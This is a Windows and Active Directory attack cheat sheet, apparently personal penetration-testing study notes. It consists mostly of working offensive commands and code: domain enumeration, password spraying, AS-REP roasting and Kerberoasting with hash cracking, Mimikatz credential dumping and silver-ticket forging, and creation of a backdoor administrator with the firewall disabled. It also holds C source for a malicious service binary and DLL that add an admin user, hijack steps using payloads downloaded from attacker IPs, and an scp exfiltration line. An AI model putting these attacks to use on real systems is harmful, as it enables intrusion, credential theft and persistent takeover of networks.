# Windows Enumeration

### Initial Access

There are several key pieces of information we should always obtain:

- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes

```bash
> powershell
> whoami
> whoami /groups
> net user
> net user steve
> Get-LocalUser
> Get-LocalGroup # Look at the different groups on the current workstation. Members of Remote Desktop Users can access the system with RDP, while members of Remote Management Users can access it with WinRM.
> Get-LocalGroupMember adminteam
# While it is crucial to know which users are privileged, it is also vital for us to understand which users can use RDP. Obtaining the credentials for one of these users may lead us to a GUI access, which often tremendously improves our means of interacting with the system.
> systeminfo # Note what version of Windows, and whether it is a 32 or 64 bit system
# Our goal in this next step is to identify all network interfaces, routes, and active network connections. Based on this information, we may identify new services or even access to other networks. This information may not directly lead us to elevated privileges, but they are vital to understand the machine's purpose and to obtain vectors to other systems and networks.
> ipconfig /all # Note whether DHCP is enables, the IP address, the Default Gateway, the Physical Address, subnet mask, and the DNS Servers
> route print #  The output of this command is useful to determine possible attack vectors to other systems or networks.
> netstat -ano # To list all active network connections. Use -a to display all active TCP connections as well as TCP and UDP ports, -n to disable name resolution, and -o to show the process ID for each connection. Look for port 3389 to be in use, if it is, you're not the only user on the system (hint: use MimiKatz to extract credentials). 
# Check all installed applications. We can query two registry keys to list both 32-bit and 64-bit applications in the Windows Registry with the Get-ItemProperty Cmdlet. We pipe the output to select with the argument displayname to only display the application's names. We begin with the 32-bit applications and then display the 64-bit applications.
> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname # You should check whether the applications on the system have public exploits
> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"
# However, the listed applications from above may not be complete. For example, this could be due to an incomplete or flawed installation process. Therefore, we should always check 32-bit and 64-bit Program Files directories located in C:\. Additionally, we should review the contents of the Downloads directory of our user to find more potential programs.
> dir "C:\Program Files"
> dir "C:\Program Files (x86)"
> dir "C:\Users\CurrentUser\Downloads"
# While it is important to create a list of installed applications on the target system, it is equally important to identify which of them are currently running. 
> Get-Process
> Get-Process NonStandardProcess | Select-Object Path # Get the path of the process
# Sensitive information may be stored in meeting notes, configuration files, or onboarding documents. With the information we gathered in the situational awareness process, we can make educated guesses on where to find such files.
> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
> Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
# If you get access to the machine through another user, then restart the file search, as permissions may have changed
> Get-ChildItem -Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue | type # Great, but only for CTFs, probably shouldn't get used to it
> findstr /spin “password” *.* # find all files with the word "password" in them
> Get-History
> (Get-PSReadlineOption).HistorySavePath
# We can obtain the IP address and port number of applications running on servers integrated with AD by simply enumerating all SPNs in the domain, meaning we don't need to run a broad port scan.
> setspn -L iis_service # or any server,client you discover
> net accounts # Obtain the account policy, lockout threshold
```

### PowerView.ps1

```bash
# This will allow you to run scripts
powershell -ep bypass
...
# Load PowerView (once it's already installed)
> . ./PowerView.ps1 # or Import-Module C:\\Tools\PowerView.ps1
# See the structure
> Get-NetDomain
# Get the domain controller IP, possibly end target
> Get-NetDomainController
# Important Policies
> Get-DomainPolicy
# Get password policy, important insights while cracking passwords 
> (Get-DomainPolicy)."system access"
# Information about the user you have access to, can be a lot of information
> Get-NetUser
# Only pull down the usernames
> Get-NetUser | select samaccountname # or select cn
# See when the users last changed their passwords, if before policy change, may be weaker
> Get-UserProperty -Properties pwdlastset
# See how many times each user has logged on, great way to identify honeypot accounts
> Get-UserProperty -Properties logoncount
# Enumerate the computer objects
> Get-NetComputer
# Get a ton of information about the computers
> Get-NetComputer -FullData # '| select {propertyName}' in order to nail down certain information, such as operating system
> Get-NetComputer | select operatingsystem,dnshostname # It's a good idea to grab this information early in the assessment to determine the relative age of the systems and to locate potentially weak targets.
# Enumerate groups
> Get-NetGroup | select cn
# See who are admins
> Get-NetGroupMember -GroupName *admin*
# Look through the different shares
> Invoke-ShareFinder
# Get the group policies, important one
> Get-NetGPO
# Narrowing down the above
> Get-NetGPO | select displayname, whenchanged
# Find out if you have admin privileges on any computers in the domain
> Find-LocalAdminAccess # May take a few minutes
# See who's logged in & other info
> Get-NetSession -ComputerName web04 -Verbose # Untrustable on Windows 11
# We can obtain the IP address and port number of applications running on servers integrated with AD by simply enumerating all SPNs in the domain, meaning we don't need to run a broad port scan
> Get-NetUser -SPN | select samaccountname,serviceprincipalname
# See if we can perform an AS-REP Roast on any users
> Get-NetUser -PreauthNotRequired
# Attempt to resolve SPN's IP
> nslookup.exe web04.corp.com # Typically located in C:\Tools\
# Enumerate ACEs, filtering on an identity
> Get-ObjectAcl -Identity stephanie # Look for AD Rights, SIDs. SID2 has AD Rights to SID1
# Convert SIDs to domain object name
> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
# Clean output, look for all users with General All Rights for "Management Department"
> Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights # Can also do this for GenericWrite,WriteOwner,WriteDACL,AllExtendedRights,ForceChangePassword,Self (Self-Membership)
# Convert multiple SIDs to readable objects at once
> "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName # If a regular user has these rights, this is likely a misconfiguration.. and should be prioritized
# Find shares in the domain
> Find-DomainShare # -CheckShareAccess to only display shares available to us
> ls \\dc1.corp.com\sysvol\corp.com\
> cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
```

### SharpHound.ps1 && BloodHound.ps1

Note that SharpHound supports looping, running cyclical queries over time like a cron job, which will gather additional data such as environment changes, new log-ons.

```bash
> . .\Sharphound.ps1 # or Import-Module .\SharpHound.ps1
> Get-Help Invoke-BloodHound
> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Users\\Public\\Desktop\ -OutputPrefix "web02" # May take a couple minutes
```

```bash
kali@kali:~$ sudo neo4j start
# Go to http://localhost:7474 and login with default credentials
kali@kali:~$ bloodhound
```

Remember to mark the computers that you own!!!!!

It's a good idea to mark every object we have access to as owned to improve our visibility into more potential attack vectors. There may be a short path to our goals that hinges on ownership of a particular object.

#### Who is logged on?

Use PsLoggedon.exe if it's an older machine, such as Server 2012 R2, 2016 (1607), 2019 (1809), and Server 2022 (21H2). Don't trust it if it says that nobody is logged on, but trust it if it says there is somebody.

```bash
.\\PsLoggedOn.exe \\file04
```

#### Interesting Object Permissions

AD includes a wealth of permission types that can be used to configure an ACE. However, from an attacker's standpoint, we are mainly interested in a few key permission types. Here's a list of the most interesting ones along with a description of the permissions they provide:

	GenericAll: Full permissions on object
	GenericWrite: Edit certain attributes on the object
	WriteOwner: Change ownership of the object
	WriteDACL: Edit ACE's applied to object
	AllExtendedRights: Change password, reset password, etc.
	ForceChangePassword: Password change for object
	Self (Self-Membership): Add ourselves to for example a group

Example abuse:

```bash
net group "Administrators" stephanie /add /domain
```

#### enum4linux

"As soon as you see that SMB is open, run enum4linux." It will try to enumerate SMB as much as it can.
```
enum4linux -A 123.123.123.123 -u user -p password # user and password are optional
```

#### smbclient

For enumerating SMB shares. I believe that you can also do it without credentials by putting an empty username and then maybe also an empty password, though maybe just the empty username. I may be getting this confused with cme smb. 

```bash
smbclient -L 123.123.123.123 -U domainname/username

# I believe that you can also do it without credentials by putting an empty username and then maybe also an empty password, though maybe just the empty username. I may be getting this confused with cme smb. 
cme smb -L -U '' 123.123.123.123
```

#### runas

Use this command to run as another user (if you have their credentials): 

```bash
>  runas /user:domainname\\username cmd.exe
```

Without access to a GUI we cannot use Runas since the password prompt doesn't accept our input in commonly used shells, such as our bind shell or WinRM. 

However, we can use a few other methods to access the system as another user when certain requirements are met. We can use WinRM or RDP to access the system if the user is a member of the corresponding groups. Alternatively, if the target user has the Log on as a batch job6 access right, we can schedule a task to execute a program of our choice as this user. Furthermore, if the target user has an active session, we can use PsExec from Sysinternals.

Since we have access to a GUI, let's use Runas in PowerShell to start cmd as user backupadmin. We'll enter the username as argument for /user: and the command we want to execute. Once we execute the command, a password prompt appears in which we'll enter the previously found password.

```bash
PS C:\Users\steve> runas /user:backupadmin cmd
Enter the password for backupadmin:
Attempting to start cmd as user "CLIENTWK220\backupadmin" ...
PS C:\Users\steve> 
```

Once the password is entered, a new command line window appears. The title of the new window states running as CLIENTWK220\backupadmin.

Use whoami to confirm the command line is working and we are indeed backupadmin.

#### schtasks

Allows you to see the scheduled tasks on your local box (once you have a shell/ssh session). The following is command useful as it will essentially answer the quesion, if we can exploit this, what kind of priviledges will we gain?

```bash
schtasks /query
...
schtasks /query /fo LIST /v > schtasks.txt  
schtasks /query /fo LIST /v /TN "FTP Backup"
```

#### Recursively Search Through Directories (May only be in CMD)

```bash
dir /s/b file.txt
```

#### Recursively Search a User's Workstation

```bash
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

#### Windows Password Spraying

```bash
 __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

PS C:\Tools> type .\usernames.txt
pete
dave
jen

# Validate Usernames
PS C:\Tools> .\kerbrute_windows_amd64.exe userenum -d corp.com --dc=dc1.corp.com usernames.txt

# Password Spraying
PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"

# If NTLM is enabled, you can use crackmapexec
kali@kali:~$ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

#### AS-REP Roasting

Must have "Do not require Kerberos preauthentication" enabled. Will provide AS-REP hash with session key and TGT, which you can try to crack with HashCat or crackstation.net.

```bash
kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

We can also perform AS-REP Roasting on Windows using Rubeus. Since we're performing this attack as a pre-authenticated domain user, we don't have to provide any other options to Rubeus except asreproast. Rubeus will automatically identify vulnerable user accounts. We also add the flag /nowrap to prevent new lines being added to the resulting AS-REP hashes.

```bash
PS C:\Tools> .\Rubeus.exe asreproast /nowrap
```

If no users have the "Do not require Kerberos preauthentication" enabled, but you have GenericWrite or GenericAll on another AD user account, you could reset their password (which would lock them out), or better yet change UAC permissions to enable "Do not require Kerberos preauthentication".

#### Kerberoasting

If we know the SPN  we want to target, we can request a service ticket for it from the domain controller. The service ticket is encrypted using the SPN's password hash. If we are able to request the ticket and decrypt it using brute force or guessing, we can use this information to crack the cleartext password of the service account.

We'll provide hashes.kerberoast as an argument for /outfile to store the resulting TGS-REP hash in. Since we'll execute Rubeus as an authenticated domain user, the tool will identify all SPNs linked with a domain user.

```bash
# Method from Windows
PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# Method from Linux
kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
# If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use ntpdate or rdate to do so.
kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

Let's assume that we are performing an assessment and notice that we have GenericWrite or GenericAll permissions on another AD user account. As stated before, we could reset the user's password but this may raise suspicion. However, we could also set an SPN for the user, kerberoast the account, and crack the password hash in an attack named targeted Kerberoasting. 

#### Silver Tickets

In general, you need to collect the following three pieces of informaiton to create a sliver ticket:
	1. SPN password hash
	2. Domain SID
	3. Target SPN

If you are a local Administrator on this machine where iis_service (the SPN) has an established session, we can use Mimikatz to retrieve the SPN password hash (NTLM hash of iis_service). If you have the password, you can generate the NTML hash with codebeautify.org.

```bash
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords # Looking for NTLM hash
```

To obtain the domain SID, the second piece of information we need, we can enter whoami /user to get the SID of the current user. Alternatively, we could also retrieve the SID of the SPN user account from the output of Mimikatz, since the domain user accounts exist in the same domain.

```bash
PS C:\Users\jeff> whoami /user # Looking for SID
---------------
User Name SID
========= =============================================
corp\jeff S-1-5-21-1987370270-658905905-1781884369 # ignore this part -1105

mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
...
mimikatz # exit
```

We should have the ticket ready to use in memory. We can confirm this with klist, and by using the service:

```bash
PS C:\Tools> iwr -UseDefaultCredentials http://web04
```

#### Create a Backdoor User

You can use this user to RDP into a session and obtain a GUI. This assumes that you are already NT Authority.
```bash
net user /add backdoor Password1
...
net localgroup administrators /add backdoor
...
# Enables RDP Connections
add "HTLM\SYSTEM\CurrentControlSet\Control\Terminal Server" \v "fDenyTSConnections" /t REG_DWORD /d 0 /f
...
# Disable the Firewalls
netsh advfirewall set allprofiles state off
...
# RDP In & Allow Clipboard Sharing
xfreerdp /v:ms01 /u:backdoor /p:Password1 +x clipboard /cert:ignore
```

#### Collecting Data for Bloodhound on Windows

We're using the SharpHound.ps1 from GitHub.
```bash
> . .\SharpHound.ps1
> Invoke-BloodHound -CollectionMethod All -Domain MARVEL.local -ZipFileName outfile.zip
```

#### Check for GPP Vulnerability

Say that you have a shell in MetaSploit, you can background that shell and run the "smb_enum_gpp" module to check if there is the GPP vulnerability in the environment.

Search in \\web02.medtech.com\sysvol\medtech.com\policies\*.xml, C:\ProgramData\Microsoft\Group Policy\history, C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history for these files: Groups.xml, Services.xml, Scheduledtasks.xml, DataSources.xml, Printers.xml, Drives.xml

#### Recursively Downloading Files with SMB

```bash
> prompt off
> recurse on
> mget *
```

#### Create a Share

```bash
> net share public=c:\\users\\public /GRANT:Everyone,FULL
```

#### NTLM v NTLMv2

NTLM hashes can be passed, NTLMv2 hashes CANNOT be passed.

#### Windows' Grep (With Context)

```bash
> schtasks /query /fo LIST | Select-String -Pattern 12 -Context 4,4
> Get-Content file.txt | Select-String -Pattern OS -Context 2,4
```

#### Execution Policy Bypass - Per script basis

```bash
# Simply append to your script
-ExecutionPolicy Bypass
```

#### Execution Policy Bypass - Per User Basis

```bash
# Get the current execution policy for your current user
Get-ExecutionPolicy -Scope CurrentUser

# Attempt the modify the execution policy
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser

# Assure that the policy was changed
Get-ExecutionPolicy -Scope CurrentUser
```


#### Getting File from Windows Machine to Local - SCP

First, ensure the SSH service is running on your Kali machine:

```bash
sudo service ssh start
```

Then, from the Windows command line or PowerShell, transfer the file:

```powershell
scp C:\path\to\file.txt kali@<KALI_IP>:/path/to/save/
```

#### Decode Base64 in Powershell

```bash
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
```

#### Change User's Password

```bash
Set-LocalUser -Name "backdoor" -Password (ConvertTo-SecureString -AsPlainText "Password123!" -Force)
```

#### Windows' Curl

Stay under the radar and use certutil.exe on Windows to download files from the internet, or use the classic:
```bash
certutil.exe -f -urlcache http://123.123.123.123/winPEASx64.exe winpeas.exe

iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
```

## When WinPEAS Fails

Use winPEAS, and if the antivirus picks that up, then try other tools such as Seatbelt and Jaws.

#### Get the Running Services

When using a network logon such as WinRM or a bind shell, Get-CimInstance and Get-Service will result in a "permission denied" error when querying for services with a non-administrative user. Using an interactive logon such as RDP solves this problem.

```bash
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

#### Get Permissions of Running Services

The icacls utility outputs the corresponding principals and their permission mask.4 The most relevant permissions and their masks are listed below:
	Mask 	Permissions
	F 	Full access
	M 	Modify access
	RX 	Read and execute access
	R 	Read-only access
	W 	Write-only access

```bash
icacls "C:\xampp\mysql\bin\mysqld.exe"
```

### Elevate Priviledges of Running Service Binary

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user overlord password123! /add");
  i = system ("net localgroup administrators overlord /add");
  
  return 0;
}
```

You need to cross-compile the code on our Kali machine with mingw-64.

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

```bash
PS C:\Users\dave> iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe  

PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe

PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

Now you need to restart the service. You can try this command first, though it will likely fail.

```bash
net stop mysqld
```

If the service Startup Type is set to "Automatic", we may be able to restart the service by rebooting the machine.

Here's how you check:

```bash
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```

In order to issue a reboot, our user needs to have the privilege SeShutDownPrivilege assigned. We can use whoami with /priv to get a list of all privileges.

```bash
whoami /priv
```

If you have the SeShutDownPrivilege, then restart the computer. 

```bash
shutdown /r /t 0
```

Once you're back, confirm that everything went as planned.

```bash
Get-LocalGroupMember administrators
```

We can nor use *RunAs* to obtain an interactive shell. In addition, we could also use msfvenom to create an executable file, starting a reverse shell.

If you run into trouble after priv escing, try running a powershell and cmd prompt as an administrator from the get. 

#### PowerUp.ps1 (Automated Alternative)

```bash
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80
```

```bash
# Upload the file
iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1

# This function displays services the current user can modify, such as the service binary or configuration files.
Get-ModifiableServiceFile
```

### Service DLL Hijacking

```bash
# Check what binaries are running, as before
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
# Check for permissions on the binary if you find an interesting one
icacls .\Documents\BetaServ.exe
```
If you have read and execute permissions (RX), then see if there is a missing DLL for the binary.

You can use Process Monitor to display real-time information about any process, thread, file system, or registry related activities. Our goal is to identify all DLLs loaded by BetaService as well as detect missing ones. Once we have a list of DLLs used by the service binary, we can check their permissions and if they can be replaced with a malicious DLL. Alternatively, if find that a DLL is missing, we could try to provide our own DLL by adhering to the DLL search order.

Since you need administritave privileges to run Process Monitor, it's standard practice to copy the service binary to a local machine. On this system, we can install the service locally and use Process Monitor with administrative privileges to list all DLL activity.
Browse in the Windows Explorer to C:\tools\Procmon\ and double-click on Procmon64.exe.

We enter the following arguments: Process Name as Column, is as Relation, BetaServ.exe as Value, and Include as Action. Once entered, we'll click on Add.

After applying the filter, the list is empty. In order to analyze the service binary, we should try restarting the service as the binary will then attempt to load the DLLs.

```ps
> Restart-Service BetaService
```

Look for the Detail column to state NAME NOT FOUND for these calls, which means that a DLL with this name couldn't be found in any of these paths. You can see that the order in which the DLL is being called is 

1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

You can verify with typing the command *$env:path* in Powershell.

See if you have the ability to write to any of the directories that the DLL is being called from.

If you do, this code can be used as a template for a DLL; note that in the case below we know that the DLL is trying to be loaded.. it's safer to spam all of the cases if you don't know what is going on.

```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user overlord Password123! /add");
  	    i = system ("net localgroup administrators overlord /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

Now, cross-compile the code with mingw, adding the *--shared* argument to specify that we want to build a DLL.

```bash
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

Then on the Windows machine..

```bash
cd Documents
iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll
net user
Restart-Service BetaService
net user
net localgroup administrators  # Confirm that the new user is created (with administrators privileges)
```

### Unquoted Service Paths

We can use this attack when we have Write permissions to a service's main directory or subdirectories but cannot replace files within them.

You can use this script in cmd to search for these files:

```bash
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

Now, you need to check if you have the permissions to start and stop the services that you (assumably) have found:

```bash
Start-Service GammaService
Stop-Service GammaService
```

Now, you need to see if you have the permissions to write in any of the vulnerable directories:

```bash
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Enterprise Apps"
```

You can use the same executable that we made above to replace the binary file.

```bash
iwr -uri http://192.168.119.3/adduser.exe -Outfile Current.exe
copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
Start-Service GammaService
net user 
net localgroup administrators # Verify the executable worked
```

Don't forget to put everything back where it was. :)

*Automated Unquoted Service Paths Exploitation*

```bash
iwr http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
Restart-Service GammaService
net user
net localgroup administrators # Verify
```

### Scheduled Tasks

For us, three pieces of information are vital to obtain from a scheduled task to identify possible privilege escalation vectors:

    As which user account (principal) does this task get executed?
    What triggers are specified for the task?
    What actions are executed when one or more of these triggers are met?

We can view scheduled tasks on Windows with the **Get-ScheduledTask** Cmdlet or the command **schtasks/query**. We'll use the latter. We enter /fo with LIST as argument to specify the output format as list. Additionally, we add /v to display all properties of a task. We should seek interesting information in the Author, TaskName, Task To Run, Run As User, and Next Run Time fields. In our case, "interesting" means that the information partially or completely answers one of the three questions above.

```bash
schtasks /query /fo LIST /v | Select-String -Pattern "12:0" -Context 4,4 # Smart to filter the output to tasks being run in the same hour as the current time
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe # Check permissions for scheduled task
iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe # Same binary that we made for swapping binary file
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
move .\BackendCacheCleanup.exe .\Pictures\
net user
net localgroup administrators # Verify new user is created
```

### SeImpersonatePrivilege

```bash
whoami /priv
```

```bash
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
python3 -m http.server 80
```

```bash
powershell -ep bypass
iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c powershell.exe # -i to interact w the process &  -c to specify the command we want to execute
whoami # Verify that it worked, that you are not NT AUTHORITY\SYSTEM
```

There are other similar tools such as RottenPotato, SweetPotato, or JuicyPotato.

#### Decrypt GPP Password

```bash
kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```

#### Privileges Mapped to Exploits Page, such as SeImpersonate

"https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens"